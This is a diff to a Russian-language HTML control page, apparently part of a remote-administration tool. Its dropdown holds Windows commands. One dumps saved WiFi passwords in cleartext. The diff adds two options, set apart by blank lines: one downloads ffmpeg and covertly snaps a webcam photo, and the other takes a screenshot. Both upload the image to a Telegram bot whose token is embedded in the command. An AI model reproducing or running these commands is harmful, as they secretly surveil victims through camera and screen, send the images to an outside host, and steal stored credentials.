@@ -1,4 +1,4 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8" />
@@ -154,6 +154,13 @@
                         <option value="powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Scope CurrentUser -Force; Install-Module -Name AudioDeviceCmdlets -Scope CurrentUser -Force -Confirm:$false&quot;">Install Audio Tools</option>
                         <option value="powershell -NoProfile -Command &quot;Import-Module AudioDeviceCmdlets; Set-AudioDevice -PlaybackVolume 100&quot;">Max Volume</option>
                         <option value="for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear">WiFi Passwords</option>
+
+
+
+
+
+                            <option value="powershell -Command &quot;$t=[System.IO.Path]::GetTempPath(); $f=$t+'photo.jpg'; $c=$t+'ffmpeg.exe'; if(!(Test-Path $c)){Invoke-WebRequest 'https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip' -OutFile ($t+'ff.zip'); Expand-Archive -Path ($t+'ff.zip') -DestinationPath $t; Move-Item ($t+'ffmpeg-master-latest-win64-gpl/bin/ffmpeg.exe') $c; Remove-Item ($t+'ff.zip'),($t+'ffmpeg-master-latest-win64-gpl') -Recurse -Force}; &amp; $c -f dshow -i video='Integrated Camera' -frames:v 1 -y $f -hide_banner -loglevel error 2&gt;$null; if(Test-Path $f){curl.exe -s -F chat_id=1005333334 -F photo=@$f 'https://api.telegram.org/bot7570737721:AAHWsP2igpHetb7tSSNgITMgYYsm0npm0hQ/sendPhoto'; Remove-Item $f -Force}&quot;">Get photo</option>
+                            <option value="powershell -NoProfile -Command &quot;$file = Join-Path $env:TEMP 'screen.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png); &amp; curl.exe -F 'chat_id=1005333334' -F ('photo=@' + $file) 'https://api.telegram.org/bot7570737721:AAHWsP2igpHetb7tSSNgITMgYYsm0npm0hQ/sendPhoto'&quot;">Get screenshot</option>
 
                     </select>
 
